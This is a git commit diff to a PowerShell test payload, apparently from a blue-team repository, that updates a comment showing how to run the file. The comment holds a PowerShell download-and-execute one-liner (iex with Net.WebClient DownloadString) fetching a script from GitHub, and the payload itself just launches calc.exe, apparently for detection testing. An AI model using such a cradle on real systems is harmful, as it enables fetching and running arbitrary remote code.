8dd2055427f2bec4fabc14fea4306570c891bb20
ka <64521603+kaywoz@users.noreply.github.com>
2023-08-24 12:36:17 +0200

    base url

--- powershell/payload-test1.ps1
+++ powershell/payload-test1.ps1
@@ -1,4 +1,4 @@
-## to be executed as; powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/kaywoz/bluestuff/main/powershell/Payload-nonsense.ps1')"
+## to be executed as; powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/kaywoz/bluestuff/main/powershell/payload-test1.ps1')"
 
 ##random
 calc.exe
